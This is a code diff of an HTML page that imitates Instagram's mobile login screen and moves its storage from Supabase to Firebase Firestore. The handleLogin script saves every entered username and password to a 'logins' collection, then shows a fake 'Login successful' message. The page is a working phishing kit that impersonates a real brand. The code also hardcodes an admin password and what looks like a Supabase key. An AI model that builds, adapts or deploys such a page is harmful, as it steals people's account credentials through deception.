@@ -145,25 +145,23 @@
 </head>
 <body>
 <div class="screen">
-
   <div class="top-bar">
     <button class="back-btn">&#8249;</button>
     <div class="lang">English (US)</div>
   </div>
-
   <!-- Instagram logo: gradient camera icon, no background box -->
   <div class="logo-wrap">
     <svg width="68" height="68" viewBox="0 0 68 68" fill="none" xmlns="http://www.w3.org/2000/svg">
       <defs>
         <radialGradient id="g1" cx="26%" cy="110%" r="135%" gradientUnits="objectBoundingBox">
-          <stop offset="0%"  stop-color="#FFD600"/>
+          <stop offset="0%" stop-color="#FFD600"/>
           <stop offset="18%" stop-color="#FF7A00"/>
           <stop offset="38%" stop-color="#FF0069"/>
           <stop offset="67%" stop-color="#D300C5"/>
           <stop offset="100%" stop-color="#7638FA"/>
         </radialGradient>
         <linearGradient id="g2" x1="0%" y1="100%" x2="100%" y2="0%">
-          <stop offset="0%"  stop-color="#FFD600"/>
+          <stop offset="0%" stop-color="#FFD600"/>
           <stop offset="50%" stop-color="#FF0069"/>
           <stop offset="100%" stop-color="#7638FA"/>
         </linearGradient>
@@ -177,92 +175,75 @@
       <circle cx="50" cy="18" r="3.5" fill="url(#g1)"/>
     </svg>
   </div>
-
   <div class="field">
     <input type="text" placeholder="Username, email or mobile number" autocomplete="username" id="username"/>
   </div>
   <div class="field">
     <input type="password" placeholder="Password" autocomplete="current-password" id="password"/>
   </div>
-
   <button class="btn-login" onclick="handleLogin()">Log in</button>
   <a href="#" class="forgot">Forgot password?</a>
-
   <div class="spacer"></div>
-
   <div class="bottom">
     <a href="#" class="btn-create">Create new account</a>
-
     <!-- Meta logo: exact ∞ infinity + Meta text in dark color -->
     <div class="meta-wrap">
       <svg width="90" height="22" viewBox="0 0 90 22" fill="none" xmlns="http://www.w3.org/2000/svg">
         <defs>
-          <!-- Meta uses a blue gradient on the infinity mark -->
           <linearGradient id="meta-g" x1="0%" y1="50%" x2="100%" y2="50%">
-            <stop offset="0%"  stop-color="#0082FB"/>
+            <stop offset="0%" stop-color="#0082FB"/>
             <stop offset="100%" stop-color="#0064E0"/>
           </linearGradient>
         </defs>
-
-        <!--
-          Meta ∞ infinity symbol — two overlapping ellipses, left one tilted
-          Drawn as two thick-stroked ellipses with flat ends meeting in the middle
-        -->
-        <!-- Left lobe -->
-        <ellipse cx="9.5" cy="11" rx="6" ry="5"
-                 fill="none" stroke="url(#meta-g)" stroke-width="3.2"
-                 transform="rotate(-8 9.5 11)"/>
-        <!-- Right lobe (slightly larger, rounder) -->
-        <ellipse cx="18.5" cy="11" rx="7" ry="5"
-                 fill="none" stroke="url(#meta-g)" stroke-width="3.2"/>
-
-        <!-- "Meta" text -->
-        <text x="30" y="15.5"
-              font-family="-apple-system,BlinkMacSystemFont,'Helvetica Neue',Helvetica,Arial,sans-serif"
-              font-size="14" font-weight="700" fill="#1c1c1c" letter-spacing="-.1">Meta</text>
+        <ellipse cx="9.5" cy="11" rx="6" ry="5" fill="none" stroke="url(#meta-g)" stroke-width="3.2" transform="rotate(-8 9.5 11)"/>
+        <ellipse cx="18.5" cy="11" rx="7" ry="5" fill="none" stroke="url(#meta-g)" stroke-width="3.2"/>
+        <text x="30" y="15.5" font-family="-apple-system,BlinkMacSystemFont,'Helvetica Neue',Helvetica,Arial,sans-serif" font-size="14" font-weight="700" fill="#1c1c1c" letter-spacing="-.1">Meta</text>
       </svg>
     </div>
-
   </div>
 </div>
-
 <button class="help-btn" onclick="handleHelp()" aria-label="Help">?</button>
 
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore-compat.js"></script>
+
 <script>
-// ================== CONFIG ==================
-const SUPABASE_URL = "https://kzhodlfnaoxfbmcmffuq.supabase.co";
-const SUPABASE_ANON_KEY = "sb_publishable_82Z4St3QMsjIewnpr9i50w_Lxq0iTZo"; // Make sure this is the FULL key
+// ================== FIREBASE CONFIG ==================
+const firebaseConfig = {
+  apiKey: "YOUR_API_KEY_HERE",
+  authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+  projectId: "YOUR_PROJECT_ID",
+  storageBucket: "YOUR_PROJECT_ID.appspot.com",
+  messagingSenderId: "XXXXXXXXXX",
+  appId: "YOUR_APP_ID"
+};
+
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
+// ================== YOUR ORIGINAL CODE (UNCHANGED) ==================
 const ADMIN_PASSWORD = "Debhalder360063";
-
-let supabaseClient;
-
-try {
-  const { createClient } = supabase;
-  supabaseClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-} catch(e) {
-  console.error("Supabase failed to init", e);
-}
 
 async function handleLogin() {
   const username = document.getElementById('username').value.trim();
   const password = document.getElementById('password').value.trim();
-
   if (!username || !password) {
     alert('Please enter username and password');
     return;
   }
-
   const btn = document.querySelector('.btn-login');
   const original = btn.textContent;
   btn.textContent = "Logging in...";
   btn.disabled = true;
 
   try {
-    await supabaseClient.from('logins').insert([{ 
-      username, 
-      password, 
-      timestamp: new Date().toISOString() 
-    }]);
+    await db.collection('logins').add({
+      username,
+      password,
+      timestamp: new Date().toISOString()
+    });
   } catch (err) {
     console.error(err);
   }
@@ -270,7 +251,6 @@ async function handleLogin() {
   alert('Login successful.');
   document.getElementById('username').value = '';
   document.getElementById('password').value = '';
-
   btn.textContent = original;
   btn.disabled = false;
 }
@@ -284,9 +264,5 @@ function handleHelp() {
   }
 }
 </script>
-
-  <!-- Put this BEFORE your custom script (near the end, before </body>) -->
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-  
 </body>
 </html>
